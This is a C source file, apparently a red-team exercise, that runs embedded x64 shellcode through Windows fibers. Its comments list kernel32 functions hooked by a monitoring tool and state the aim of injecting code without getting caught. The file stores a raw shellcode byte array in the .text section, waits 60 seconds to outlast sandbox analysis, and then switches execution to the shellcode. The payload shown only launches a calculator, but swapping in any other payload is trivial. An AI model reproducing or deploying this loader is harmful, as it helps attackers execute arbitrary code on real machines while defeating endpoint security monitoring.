#include<Windows.h>
#include<stdio.h>

/*
note: The kernel32 APIs which are hooked are
* 1. VirtualAlloc
* 2. WriteProcessMemory
* 3. VirtualFree
* 4. VirtualFreeEx
* 5. VirtualProtect
* 6. MapViewOfFile
* 7. VirtualProtectEx
* 8. UnmapViewOfFile
* 9. VirtualQuery
* 10. ReadProcessMemory
* 11. InternetOpenUrlW
* 12. InternetReadFile
* 13. InternetReadFileExW
* 14. InternetOpenW
*/

// Target: Use kernel32 winapis to successfully do a simple process injection without getting caught !

// We used the concept of using Fibers to execute shellcode and thus bypassing all the hooks attached using BEOTM

#pragma section(".text")
__declspec(allocate(".text")) const unsigned char Rawx64CalcShellcode[] = {
	0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
	0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
	0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
	0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
	0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
	0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
	0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
	0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
	0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};

int main() {

	LPVOID	PrimaryFiberAddress = NULL,
		ShellcodeFiberAddress = NULL;
	if (!(ShellcodeFiberAddress = CreateFiber(0x00, (LPFIBER_START_ROUTINE)Rawx64CalcShellcode, NULL))) {
		printf("[!] CreateFiber Failed With Error: %d \n", GetLastError());
		return -1;
	}
	if (!(PrimaryFiberAddress = ConvertThreadToFiber(NULL))) {
		printf("[!] ConvertThreadToFiber Failed With Error: %d \n", GetLastError());
		return -1;
	}
	printf("[+] Sleeping for 60 seconds before execution...\n");
	Sleep(10000*6);

	SwitchToFiber(ShellcodeFiberAddress);
}



